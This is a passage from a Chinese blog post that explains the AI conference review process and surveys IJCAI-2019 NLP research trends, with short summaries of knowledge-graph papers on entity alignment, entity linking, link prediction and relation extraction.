Reject”处理。处理之后的投稿（Submission）便为有效投稿。</span><br><span class="line"></span><br><span class="line">2. 这些稿件会由PC Chair根据一定规则分配给高级程序委员会委员</span><br><span class="line">（Senior PC，IJCAI/AAAI一般是这个叫法）或领域主席（Area Chair，CVPR/ICCV/ECCV一</span><br><span class="line">般用此称谓），这些人便是论文最终命运的判决者，也是在审稿最后时刻书写meta review的</span><br><span class="line">meta reviewer——一般会由领域内颇有建树、有判断力的专家学者担任。而后，这些meta reviewer</span><br><span class="line">会继续分配稿件给到实际操刀审稿、给出具体审稿意见的审稿人（Reviewer）。</span><br><span class="line">对于CVPR/ICCV/ECCV等CV领域会议，近几年每个AC负责的文章大约在30-50篇左右，</span><br><span class="line">而普通审稿人分配的稿件一般不超过10篇/人。以CVPR 2019为例，针对5160篇有效投稿，</span><br><span class="line">全球共召集了132位AC和2887位审稿人。一共提交了超过15000条审稿意见，做到了平均一篇文章至少3条，</span><br><span class="line">其中一篇文章甚至有7条审稿意见之多。</span><br><span class="line"></span><br><span class="line">3. rebuttal环节: 在reviewer各自独立提交审稿意见并经由AC检查质量之后，</span><br><span class="line">绝大多数会议会将首轮意见开放给作者（目前Data Mining领域的KDD、ICDM等仍</span><br><span class="line">保持不设rebuttal环节的传统），作者可根据意见内容进行rebuttal来更正审稿人理解的错误、</span><br><span class="line">解释/澄清审稿人的疑虑、提供更多方法和实验细节等信息。在收回作者rebuttal之后，</span><br><span class="line">同一篇文章的首轮意见、作者rebuttal信息均会开放给所有审稿人和责任AC，</span><br><span class="line">进入paper discussion环节。</span><br><span class="line"></span><br><span class="line">4.paper discussion环节:Discussion时，AC会主持每篇文章的讨论，每位审稿人根据其他审稿人意见</span><br><span class="line">和作者rebuttal会留言给其他审稿人。经过几天系统线上讨论，所有审稿人需更新自己最终意见。</span><br><span class="line">更新的意见以及整个讨论过程，再加上AC自己的判断会作为AC给予每篇论文生杀予夺的重要依据：</span><br><span class="line">若多数审稿人在rebuttal后提高了论文得分或保持accept认为可以接收，则文章有较大概率可被录用；</span><br><span class="line">若多数审稿人在rebuttal后降分或保持reject，则这篇文章命运便岌岌可危。可以看到，</span><br><span class="line">rebuttal在整个论文录用过程中起到了举足轻重的作用——优秀的rebuttal能力挽狂澜；</span><br><span class="line">无力的rebuttal则于事无补甚至会画蛇添足、过犹不及。</span><br><span class="line"></span><br><span class="line">5. 特别的，CV领域的会议如CVPR/ICCV/ECCV等在AC给予最终决定时，有开线下AC meeting的传统，</span><br><span class="line">即在paper discussion之后会选在某个城市线下召集所有AC共同决定了投稿的最终命运。一般而言，</span><br><span class="line">一篇文章是否录用由三位（有时两位）没有conflict domain的AC共同决定，称作“AC Triplet”。</span><br><span class="line">到此，每篇会议论文最终结果（录用与否以及oral、poster、spotlight）便盖棺定论，</span><br><span class="line">等待着PC Chair公布给如坐针毡的作者们。</span><br><span class="line"></span><br><span class="line">以上内容来自于:https://zhuanlan.zhihu.com/p/104298923?utm_source=qq</span><br></pre></td></tr></table></figure><h3 id="2-论文投稿的主题组成"><a href="#2-论文投稿的主题组成" class="headerlink" title="2. 论文投稿的主题组成"></a>2. 论文投稿的主题组成</h3><ul><li>在论文的主题上，机器学习依然是最热的一个领域，收录数量为 438 篇，超过半数，<br>且提交论文中，共有 2516 篇为机器学习领域，<br>此外论文数量最多的领域依次为计算机视觉，机器学习应用，自然语言处理。各个<br>主题的提交于录用情况如下图所示:</li></ul><p><img src="https://img-blog.csdnimg.cn/20200313193636890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><ul><li>由上图可知，其中NLP submitted 630篇，而最后录用的只有103篇，Knowledge representation<br>投稿349篇，最终录用88篇</li></ul><h2 id="3-IJCAI-2019-NLP-领域的研究风向与分析"><a href="#3-IJCAI-2019-NLP-领域的研究风向与分析" class="headerlink" title="3. IJCAI-2019 NLP 领域的研究风向与分析"></a>3. IJCAI-2019 NLP 领域的研究风向与分析</h2><hr><h3 id="1-IJCAI-2019-NLP领域的研究概况"><a href="#1-IJCAI-2019-NLP领域的研究概况" class="headerlink" title="1. IJCAI-2019 NLP领域的研究概况"></a>1. IJCAI-2019 NLP领域的研究概况</h3><p>IJCAI 2019 NLP领域占全部接受论文总数的9.91%，较去年有所下降，主要集中在如下的几个方面:</p><ul><li>Sentiment Analysis     </li><li>Cross-Modal Information</li><li>Information Retrieval</li><li>Text Classification</li><li>Q&amp;A</li><li>Visual Dialog  可视化对话</li><li>Word Embedding</li><li>knowledge Representation</li><li>Text style transfer</li><li>Named Entity Recognition</li><li>Sentiment detection </li><li>Relation Extraction  </li><li>Network Embedding</li><li>Text Generation</li><li>Machine Translation etc.</li></ul><h3 id="2-IJCAI-2019-NLP领域的详细概况"><a href="#2-IJCAI-2019-NLP领域的详细概况" class="headerlink" title="2. IJCAI-2019 NLP领域的详细概况"></a>2. IJCAI-2019 NLP领域的详细概况</h3><p>根据IJCAI-2019 NLP的录用的所有文章的总结,详细分析如下(为方便观看，截图如下):</p><p><img src="https://img-blog.csdnimg.cn/20200313193703830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><p><img src="https://img-blog.csdnimg.cn/20200313193718965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><p><img src="https://img-blog.csdnimg.cn/20200313193732420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><p><img src="https://img-blog.csdnimg.cn/20200313193744237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以上83篇论文可到[4] https://github.com/Pin-Ni/NLP-in-IJCAI-2019下载</span><br></pre></td></tr></table></figure><ul><li>有意思和新颖的主题如：图像与文本的匹配，多人对话(公司参与，落地)，$GAN$做文本生成，文本风格迁移，<br>实体与事件提取</li><li>将知识融入NLP架构<ul><li>常识推理</li><li>科学问答</li></ul></li><li>关于知识图谱构建的NLP的一些子任务: 关系抽取，命名实体识别，依存句法分析，$Word Embedding$,<br>$Releation Embedding$，实体链接(EL,主要有端到端以及仅消除歧义两类方法)，细粒度抽取</li><li>社交媒体分析是与自然语言处理密切相关的研究主题，在最近的与NLP相关的会议中，无论从提交的数量还是参与者的人数来看，很明显，情感分析和社交媒体分析无疑是两个主要的研究主题</li><li>多模态学习</li><li>迁移学习/多任务学习</li><li>从应用程序的角度来看，新颖的在线应用程序涉及社交媒体分析和情感分析，例如紧急情况管理，社交推荐，用户行为分析，用户社交社区分析和未来预测是NLP和AI研究人员关注的主题</li><li>无监督预训练火热，主要是由BERT(2018年10月诞生)以及其他变体驱动(Bert with his friends)</li><li>图卷积网络在自然语言处理任务上的进展</li></ul><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">补充点:</span><br><span class="line">1. Cross Modal 跨模态</span><br><span class="line">跨模态学习日益引起了学术界和工业界的关注。</span><br><span class="line">跨模态学习进行联合特征学习和跨模态关系建模，</span><br><span class="line">旨在有效地利用不同模态内容的相关性进行系统性能优化。</span><br><span class="line">对多模态内容的深入理解主要依赖于特征学习、实体识别、知识图谱、逻辑推理、</span><br><span class="line">语言表达等方面的多种技术。</span><br><span class="line">2. Cross Modal Information Retrieval 跨模态信息检索</span><br><span class="line">模态是指数据的存在形式，比如文本、音频、图像、视频等文件格式。</span><br><span class="line">有些数据的存在形式不同，但都是描述同一事物或事件的。</span><br><span class="line">而我们在信息检索的需求往往不只是同一事件单一模态的数据，</span><br><span class="line">也可能需要其他模态的数据来丰富我们对同一事物或事件的认知，</span><br><span class="line">此时就需要跨模态检索来实现不同模态数据之间的检索。</span><br></pre></td></tr></table></figure><h3 id="3-IJCAI-2019-NLP领域知识图谱类论文解读-部分"><a href="#3-IJCAI-2019-NLP领域知识图谱类论文解读-部分" class="headerlink" title="3. IJCAI-2019 NLP领域知识图谱类论文解读(部分)"></a>3. IJCAI-2019 NLP领域知识图谱类论文解读(部分)</h3><h4 id="Section-1-【知识图谱对齐】"><a href="#Section-1-【知识图谱对齐】" class="headerlink" title="Section 1 【知识图谱对齐】"></a>Section 1 【知识图谱对齐】</h4><p><b>Multi-view Knowledge Graph Embedding for Entity Alignment 多视角知识图谱嵌入的实体对齐</b></p><p><img src="https://img-blog.csdnimg.cn/20200313193830819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">1. 什么是知识图谱嵌入（KGE)?</span><br><span class="line">知识图谱嵌入作为一种新的研究方向，关键思想是嵌入KG的组件，</span><br><span class="line">包括将实体和关系转化为连续的向量空间，从而简化操作，同时保留KG的原有的结构。</span><br><span class="line">那些实体和关系嵌入能进一步应用于各种任务中，如KG补全、关系提取、实体分类和实体解析。</span><br><span class="line"></span><br><span class="line">具体可参考: 《Knowledge Graph Embedding: A Survey of Approaches and Applications》</span><br><span class="line">和刘知远老师的《知识表示学习的研究与进展》做的总结</span><br><span class="line"></span><br><span class="line">2. 什么是实体对齐?</span><br><span class="line">* 实体对齐(Entitiy alignment) 旨在发现不同知识图谱中称为真实世界相同事物的实体,</span><br><span class="line">* 实体对齐是指给定两个网络，把两个网络中等价的实体合并。实体对齐在很多领域都有重要应用，</span><br><span class="line">比如，跨平台社交网络的用户对齐可以用于用户画像、</span><br><span class="line">用户兴趣挖掘，跨语言知识图谱的实体对齐可以辅助机器翻译、跨语言信息检索。</span><br><span class="line">* 其中基于知识图谱嵌入的实体对齐方法近来备受关注，2019年可以说是对齐任务模型爆炸增长的一年，</span><br><span class="line">新的方向和思路层出不穷，主要分为四个：</span><br><span class="line">   * 无监督对齐,第一种思路是让结构和属性信息相互”监督“，从而达到不需要预先匹配实体的效果,另一种思路是基于对抗的方法对齐两个网络。让判别器区分两个网络中生成的点，直到判别器无法判别生成的点来自哪个网络，两个网络就对齐了。</span><br><span class="line">   * 多视角嵌入，由于对齐问题的复杂性，单一模型的嵌入能力往往不足以对齐两个网络，因此从多种视角来对齐效果会更好</span><br><span class="line">   * 改进现有的嵌入表示模型并用于对齐。相当于从底层改进对齐效果，</span><br><span class="line">   * 超大规模对齐</span><br><span class="line"></span><br><span class="line">3. 现有基于嵌入的实体对齐方法存在什么问题?</span><br><span class="line"></span><br><span class="line">a. 知识图谱存在多种特征，现有方法仅利用了其中的一种或两种，被广泛使用的特征是</span><br><span class="line">关系型 三元组 (relation triples) ，</span><br><span class="line">近来也有方法尝试使用属性型三元组 (attribute triples)，但并未完全利用知识图谱</span><br><span class="line">的已有特征，因此本文希望整合使用多种特征来提升实体对齐的效果；</span><br><span class="line"></span><br><span class="line">b. 现有方法依赖大量的已对齐实体对作为监督信息来训练模型，然而这些监督信息在现实中</span><br><span class="line">很难获得。此外，现有方法大多忽略或不重视关系或属性对齐，而关系或属性对齐可以在很大程度</span><br><span class="line">上帮助实体对齐任务。</span><br><span class="line"></span><br><span class="line">3. 论文贡献与方法</span><br><span class="line">提出了一种基于多视图知识图谱嵌入的实体对齐框架，称为 MultiKE,主要有以下几点: </span><br><span class="line"></span><br><span class="line">a. 从数据出发，我们定义了三种具有代表性的视图，分别是：名称视图 (name view)、</span><br><span class="line">关系视图 (relation view) 和属性视图 (attribute view)，</span><br><span class="line">如上图所示，并针对每个视图采用适当的模型进行训练；</span><br><span class="line">b. 针对实体对齐任务，我们从实体和关系或属性两个层面设计了跨知识图谱监督方式，来保留和丰富对齐信息</span><br><span class="line">c. 提出了三种组合策略，从多个特定视图的实体表示中，获得最终的用于实体对齐任务的实体表示；</span><br><span class="line">d. 两个数据集上进行实验，实验表明 MultiKE 在实体对齐任务上明显优于当前已有的相关方法。</span><br><span class="line"></span><br><span class="line">由于本篇文章主要是关于IJCAI-2019 的概览，因此对具体细节不做讨论,具体方法与实验可详见论文</span><br></pre></td></tr></table></figure><p><b>Relation-Aware Entity Alignment for Heterogeneous Knowledge Graphs  【实体对齐】</b></p><p><img src="https://img-blog.csdnimg.cn/20200313193857820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 论文动机与贡献</span><br><span class="line">该论文旨在解决知识图谱中的实体对齐问题，为了能够捕获复杂的语义信息，</span><br><span class="line">作者提出了一种关系敏感式对偶图卷积网络（Relation-aware Dual-Graph Convolutional Network, RDGCN）模型。</span><br><span class="line">如上图所示</span><br><span class="line"></span><br><span class="line">2. 论文方法</span><br><span class="line">a. 首先，基于原始的图结构构建对偶关系图；</span><br><span class="line">b. 然后，通过原始attention层和对偶attention层进行迭代；</span><br><span class="line">c. 接着，通过GCN网络进一步结合结构信息；</span><br><span class="line">d. 最后，得到实体的向量表示，用于实体对齐任务。</span><br><span class="line">实体抽取该论文的实验部分采用了JAPE的数据集DBP15K，主要对比方法有MTransE、JAPE、IPTransE、BootEA和GCN-Align，该论文所提出的方法RDGCN取得了相对较优的结果。</span><br></pre></td></tr></table></figure><p><b>Entity Alignment for Cross-lingual Knowledge Graph with Graph Convolutional Networks</b></p><p><img src="https://img-blog.csdnimg.cn/20200313193914774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">本文提出了一种基于图卷积网络的跨语言实体对齐方法，通过设计一种属性 embedding </span><br><span class="line">用于 GCN 的训练，发现GCN能同时学习到特征 embedding 和属性 embedding 的信息。</span><br><span class="line">实验表明该方法是目前性能最好的的 GCN 对齐模型。</span><br><span class="line"></span><br><span class="line">1. 动机</span><br><span class="line">在近期的研究工作中， GCN被用来处理一些基于图的学习问题，也有研究者提出基于该模型的</span><br><span class="line">跨语言知识图谱实体对齐工作。但这些工作并没有有效的利用图谱的属性信息，且对整体模型</span><br><span class="line">带来了负面的影响，这主要是因为对于同一实体，在不同语言上，它的属性存在较大的差异。</span><br><span class="line">虽然也有研究者提出异构图注意力网络，提供了节点级与语义级的注意力机制。但这个方法依然</span><br><span class="line">没有考虑不同属性带来的影响。</span><br><span class="line">基于上述分析，作者提出利用GCN的聚合能力将属性embedding加入跨语言知识图谱对齐中。</span><br><span class="line"></span><br><span class="line">2. 方法</span><br><span class="line">上图描述了本文提出模型的主要框架和流程，待对齐的知识图谱主要提供了两个角度的信息，</span><br><span class="line">其一是图谱本身的图结构信息，这个部分被直接输入到GCN中， GCN包含多层网络，</span><br><span class="line">其二，为了提高不同语言实体信息embed到统一的向量空间中的精准性，</span><br><span class="line">作者设计了增强的属性embedding方法，用于减少不同语言对等实体之间的差异性。</span><br></pre></td></tr></table></figure><h4 id="Section-2-【知识图谱嵌入与链接预测】"><a href="#Section-2-【知识图谱嵌入与链接预测】" class="headerlink" title="Section 2 【知识图谱嵌入与链接预测】"></a>Section 2 【知识图谱嵌入与链接预测】</h4><p><b>Neural Collective Entity Linking Based on Recurrent Random Walk<br>Network Learning 【实体链接】</b></p><p><img src="https://img-blog.csdnimg.cn/20200313193951538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1, 动机与成果</span><br><span class="line">由于神经网络具有良好的学习语义表征能力，现有的实体连接研究已经开始借鉴</span><br><span class="line">利用神经网络的局部特征对实体兼容性和不同 EL 决策间的全局相互依赖性进行目标实体消歧。 </span><br><span class="line">然而，大多数神经元集体 EL 方法完全依赖于神经网络来自动建模不同 EL 决策之间的语义</span><br><span class="line">依赖关系</span><br><span class="line">缺乏来自外部知识的指导</span><br><span class="line">在本文中，我们提出了一种用于共同的EL的具有递归 random-walk layers的端到端神经网络</span><br><span class="line">上图则为RRWEL模型</span><br><span class="line">2. 方法</span><br><span class="line">首先，我们建立了一个基于局部上下文特征的模型，然后，在此基础上提出了一个基于局部上</span><br><span class="line">下文特征的模型</span><br><span class="line">然后堆叠random-walk layers，以加强证据使得相关的 EL成为高概率决策，</span><br><span class="line">其中候选实体之间的语义相互依赖性主要是从</span><br><span class="line">一个外部知识库引导。 最后，在传统的目标函数中引入一个语义规则器，保持集体 EL</span><br><span class="line"> 决策的一致性，从而使外部 EL 决策具有一致性</span><br><span class="line">知识库可以在集体 EL 决策中充分利用。 实验结果和对各种数据集的深入分析表明，本文的</span><br><span class="line">模型比其他最先进的模型获得了更好的性能</span><br><span class="line"></span><br><span class="line">3. 关于实体链接的简单补充</span><br><span class="line"></span><br><span class="line">*  实体链接任务是做什么的?</span><br><span class="line">实体链接（entity linking）就是将一段文本中的某些字符串映射到知识库中对应的实体上。</span><br><span class="line">比如对于文本“郑雯出任复旦大学新闻学院副院长”，就应当将字符串“郑雯”、“复旦大学”、</span><br><span class="line">“复旦大学新闻学院”分别映射到对应的实体上。在很多时候，</span><br><span class="line">存在同名异实体或者同实体异名的现象，因此这个映射过程需要进行消歧，</span><br><span class="line">比如对于文本“我正在读《哈利波特》”，其中的“《哈利波特》”应指的是“《哈利波特》（图书）”</span><br><span class="line">这一实体，而不是“《哈利波特》系列电影”这一实体。当前的实体链接一般</span><br><span class="line">已经识别出实体名称的范围（一般称作mention），需要做的工作主要是实体（称作entity）</span><br><span class="line">的消歧。也有一些工作同时做实体识别和实体消歧，变成了一个端到端的任务。</span><br><span class="line"></span><br><span class="line">* 实体链接的难点在于两个方面，即多词一义和一词多义</span><br><span class="line"></span><br><span class="line">* 实体链接包括两个步骤，即指称识别和实体消歧（或者候选实体生成和候选实体排序）两个过程</span><br></pre></td></tr></table></figure><p><b>Robust Embedding with Multi-Level Structures for Link Prediction</b></p><ul><li>M-GNN 架构</li></ul><p><img src="https://img-blog.csdnimg.cn/20200313194010259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><ul><li>Graph coarsening 图采样/图粗化</li></ul><p><img src="https://img-blog.csdnimg.cn/2020031319402527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. 论文动机</span><br><span class="line">* 知识图谱嵌入对于链接预测而言，至关重要，最近有许多研究应用encoder-decoder模型</span><br><span class="line">来解决这个问题，其中encoder主要归纳为graph neural network，decoder部分主要</span><br><span class="line">使用一种embedding的方法，这些方法强制在结构信息中使用embedding技术，非常糟糕的</span><br><span class="line">是基于GNN框架的这种方法仍然面临着3个严重的问题：</span><br><span class="line">    * low represential power 代表能力过于低下</span><br><span class="line">    * stacking in a flat way 始终不断的堆叠模型</span><br><span class="line">    * poor robustness to noise 对于噪声情况鲁棒性过差</span><br><span class="line">* 在本文中我们提出了一个新的多层图卷积模型(M-GNN)来解决上述面临的挑战，模型架构如上图1</span><br><span class="line">所示</span><br><span class="line"></span><br><span class="line">2. 论文的思路</span><br><span class="line">* 首先我们确定了一种injective aggregate schema 并且设计了一种使用多层感知机(MLPs)的</span><br><span class="line">GNN layer</span><br><span class="line">* 其次,我们定义了对于多种关系之间的Graph coarsening(图粗化/图池化，实际目的就是用来生</span><br><span class="line">成图表示，核心要义在于：操作本身要对结点顺序不敏感，为了使得同构图的表示能够保持一致，大体</span><br><span class="line">显示如上图2所示）</span><br><span class="line">同时在这一系列图池化中堆叠GNN layers,以便为层次结构建模。 此外，我们在方法中使用了</span><br><span class="line">注意力机制，目的是为了让我们的方法在噪音较大的知识图谱中也能够多出准确的链接预测任务</span><br><span class="line">最后的结果是在FB15k-237上表示显著，M-GNN 具有很强的鲁棒性到稀疏和噪音。</span><br></pre></td></tr></table></figure><p><b>Unsupervised Embedding Enhancements of Knowledge Graphs using Textual Associations 使用文本关联的知识图谱无监督嵌入增强</b></p><p><img src="https://img-blog.csdnimg.cn/20200313194256930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. 动机</span><br><span class="line">知识图谱嵌入对于表示多关系数据并从中学习是有用的，最近的嵌入模型</span><br><span class="line">显示出从现有数据库中推断新事实的高效性。但是，这种结构精确的数据通常在数量</span><br><span class="line">和范围上受到限制。因此，要完全优化嵌入，还必须考虑更广泛的可用信息源，例如文本。</span><br><span class="line"></span><br><span class="line">2. 论文思路</span><br><span class="line">本文介绍了一种无监督的方法，该方法通过使用关联词的嵌入来增强实体嵌入来合并文本信息。</span><br><span class="line">该方法不会修改知识图谱嵌入的优化目标，而是可以将其与现有的嵌入模型集成。</span><br><span class="line">考虑了两种不同形式的文本数据，针对每种情况建议了不同的嵌入增强功能。</span><br><span class="line">* 在第一种情况下，每个实体都有一个描述它的关联文本文档。</span><br><span class="line">* 在第二种情况下，文本文档不可用，而是实体以单词或短语的形式出现在非结构化的文本片段中。</span><br><span class="line">实验表明，将两种方法应用于许多不同的知识图谱嵌入模型时，都可以改善链接预测任务。</span><br><span class="line"></span><br><span class="line">3. 论文小结</span><br><span class="line">本文讨论了两种新颖的方法，可以利用文本数据中的信息来增强知识图中的实体嵌入。</span><br><span class="line">第一种方法将实体矢量表示为与每个实体相关联的单词的直接函数，并且只要文本数据</span><br><span class="line">以实体描述的形式可用，就可以应用。 第二种方法在文本文档上训练 word2vec 算法，</span><br><span class="line">并将它从实体名称中学到的功能添加到原始实体功能向量中。实证结果表明，如果文本数据</span><br><span class="line">具有足够的质量，则与没有文本的嵌入和用于合并文本的替代方法相比，这两种方法都</span><br><span class="line">可以提高许多不同嵌入模型上的链接预测精度。</span><br></pre></td></tr></table></figure><h4 id="Section-3-【关系抽取与关系表示】"><a href="#Section-3-【关系抽取与关系表示】" class="headerlink" title="Section 3 【关系抽取与关系表示】"></a>Section 3 【关系抽取与关系表示】</h4><p><b>【Relation Extraction Using Supervision from Topic Knowledge of Relation Labels】关系抽取</b></p><p><img src="https://img-blog.csdnimg.cn/20200313194323469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">1. 动机</span><br><span class="line"></span><br><span class="line">* 关系抽取旨在基于文本上下文识别出实体对的语义关系。这些关系通常是预先定义好的。</span><br><span class="line">例如，给定实体对[ Microsoft, Bill Gates ]和</span><br><span class="line">句子“Bill Gates co-founded Microsoft withhis childhood friend Paul Allen”，</span><br><span class="line">我们希望抽取出关系“ founder ”。</span><br><span class="line">* 传统的方法通常将关系抽取建模为分类问题或者标注问题。在这些方法中，</span><br><span class="line">不同的关系标签往往被视为不同的 ID。例如，在关系分类中，</span><br><span class="line">每个 ID 代表多分类问题的一个类别（ class ）。给定一个样本，</span><br><span class="line">模型将其映射到一个或多个关系 ID 。然而，关系标签包含着非常丰富的语义信息，</span><br><span class="line">这些语义信息被现有的关系抽取模型所忽略。我们认为，充分建模关系标签的语义信息</span><br><span class="line">并将其作为关系分类的监督信号，有望进一步提升关系抽取性能。很显然，仅仅靠关系</span><br><span class="line">标签这个词组本身很难挖掘出太多的语义信息。因此，我们需要引入额外的信息作为关系</span><br><span class="line">的背景知识。</span><br><span class="line">* 为了克服这一挑战，本文求助于主题模型。对于预定义关系，我们通过相应的</span><br><span class="line">训练句子集合进行主题建模，进而从训练数据中挖掘出关系的主题知识。我们的基本假设是：</span><br><span class="line">对于每个关系，其标注句子集合包含几个潜在主题，并且这些主题在语义上与关系是相关的。</span><br><span class="line">通过主题建模，我们提取前k个带权重的主题词来表示关系的语义。因此，关系的主题知识</span><br><span 